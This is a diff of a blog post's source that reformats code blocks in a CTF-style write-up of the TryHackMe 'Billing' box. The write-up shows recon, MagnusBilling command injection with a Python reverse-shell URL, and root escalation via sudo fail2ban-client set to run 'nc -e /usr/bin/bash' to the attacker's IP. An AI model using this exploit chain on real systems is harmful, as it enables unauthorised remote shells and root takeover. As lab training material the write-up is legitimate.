@@ -26,8 +26,7 @@ Logged in today and noticed a new box in the recent rooms.  Let's give it a whir
 
 Per the usual, run nmap to get a list of the services running on top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.121.180
 [sudo] password for kali: 
@@ -63,14 +62,13 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 29.29 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap's vuln category scripts.  I like to look for low-hangin fruit.  Why not?
 
-{% raw %}
-```bash
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ sudo nmap --script vuln -oN vulnchk 10.10.121.180
 [sudo] password for kali: 
@@ -89,14 +87,13 @@ PORT     STATE SERVICE
 3306/tcp open  mysql
 
 Nmap done: 1 IP address (1 host up) scanned in 67.65 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Run nmap for udp.  I am a completionist, after all.
 
-{% raw %}
-```bash
+{% capture nmapudp %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ sudo nmap -sU -oN nmapudp 10.10.121.180   
 [sudo] password for kali: 
@@ -113,14 +110,13 @@ PORT     STATE         SERVICE
 5353/udp open|filtered zeroconf
 
 Nmap done: 1 IP address (1 host up) scanned in 1098.72 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapudp %}
 
 <br />
 Run curl -I to try and finger-print any technologies.
 
-{% raw %}
-```bash
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ curl -I http://10.10.121.180
 HTTP/1.1 302 Found
@@ -128,8 +124,8 @@ Date: Sat, 08 Mar 2025 07:23:48 GMT
 Server: Apache/2.4.56 (Debian)
 Location: ./mbilling
 Content-Type: text/html; charset=UTF-8
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -143,10 +139,7 @@ Check the landing page the webserver is serving.
 <br />
 Run curl -I to try and finger-print any technologies.
 
-{% raw %}
-```html
-view-source:http://10.10.121.180/mbilling/
-
+{% capture landingsource %}
 <!DOCTYPE HTML>
 <html manifest="cache.appcache">
     <head>
@@ -159,20 +152,17 @@ view-source:http://10.10.121.180/mbilling/
 
     </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.121.180/mbilling/' content=landingsource %}
 
 <br />
 Check the robots.txt file for anything interesting.
 
-{% raw %}
-```html
-http://10.10.121.180/robots.txt
-
+{% capture robotstxt %}
 User-agent: *
 Disallow: /mbilling/
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='http://10.10.121.180/robots.txt' content=robotstxt %}
 
 <br />
 Check the loading screen that appears briefly before the landing page loads.
@@ -196,8 +186,7 @@ Check the Google machine for MagnusBilling from the splash screen.  Discover CVE
 <br />
 Play with the curl command from the article to achieve command injection.
 
-{% raw %}
-```bash
+{% capture idrce %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ curl -I http://10.10.121.180/mbilling/lib/icepay/icepay.php?democ=iamhacked;id;#'        
 HTTP/1.1 200 OK
@@ -206,20 +195,19 @@ Server: Apache/2.4.56 (Debian)
 Content-Type: text/html; charset=UTF-8
 
 uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),113(wireshark),116(bluetooth),129(scanner),136(vboxsf),137(kaboxer)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=idrce %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ sudo nc -nlvp 443                      
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Use revshells to generate a one-liner payload.
@@ -240,30 +228,27 @@ Take the url from the curl command from earlier, replace the id with the revshel
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture updaterevshells %}
 http://10.10.121.180/mbilling/lib/icepay/icepay.php?democ=iamhacked;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.4.119.29%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27;#'
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=updaterevshells %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.121.180] 36966
 asterisk@Billing:/var/www/html/mbilling/lib/icepay$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Run sudo -l to get a list of commands that can be run as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo -l
 sudo -l
 Matching Defaults entries for asterisk on Billing:
@@ -275,8 +260,8 @@ Runas and Command-specific defaults for asterisk:
 
 User asterisk may run the following commands on Billing:
     (ALL) NOPASSWD: /usr/bin/fail2ban-client
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Check the manpage for fail2ban-client.
@@ -301,19 +286,17 @@ Research fail2ban-client for any privilege escalation techniques that currently 
 <br />
 Start another netcat listener.
 
-{% raw %}
-```bash
+{% capture start4444listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ nc -nlvp 4444 
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start4444listener %}
 
 <br />
 Check the output from the help for fail2ban-client on how to update the commands that will be run on a ban.
 
-{% raw %}
-```bash
+{% capture f2boutput %}
 <snip>
 
                                              COMMAND ACTION CONFIGURATION
@@ -336,14 +319,13 @@ Check the output from the help for fail2ban-client on how to update the commands
                                              <ACT> for <JAIL>
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=f2boutput %}
 
 <br />
 Check the /etc/fail2ban/jail.conf file to find the necessary action and jail we will need to update the iptable-multiport with a reverse shell.
 
-{% raw %}
-```bash
+{% capture jailconf %}
 #
 # WARNING: heavily refactored in 0.9.0 release.  Please review and
 #          customize settings for your setup.
@@ -380,25 +362,23 @@ logpath = %(sshd_log)s
 backend = %(sshd_backend)s
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include codebox.html title="jail.conf" content=jailconf %}
 
 <br />
 Run the command from the help to set the jail, action, and command with sshd and iptables-multiport.
 
-{% raw %}
-```bash
+{% capture setjailcommand %}
 asterisk@Billing:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban '/usr/bin/nc -e /usr/bin/bash 10.4.119.29 4444'
 <ban '/usr/bin/nc -e /usr/bin/bash 10.4.119.29 4444'
 /usr/bin/nc -e /usr/bin/bash 10.4.119.29 4444
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=setjailcommand %}
 
 <br />
 Run hydra to trigger the fail2ban response.
 
-{% raw %}
-```bash
+{% capture hydratrigger %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.200.93 ssh
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -408,28 +388,26 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-08 22:13:
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
 [DATA] attacking ssh://10.10.200.93:22/
 ^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hydratrigger %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchrootshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/billing]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [10.4.119.29] from (UNKNOWN) [10.10.200.93] 36292
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchrootshell %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 cat /root/root.txt
 <redacted>
 ip a
@@ -447,14 +425,13 @@ ip a
        valid_lft 3349sec preferred_lft 3349sec
     inet6 fe80::e9:a9ff:fe71:e60f/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 cat /home/magnus/user.txt
 <redacted>
 ip a
@@ -472,8 +449,8 @@ ip a
        valid_lft 3323sec preferred_lft 3323sec
     inet6 fe80::e9:a9ff:fe71:e60f/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Interesting little box, I think.  Hopefully, you liked it too.  See you in the next one.
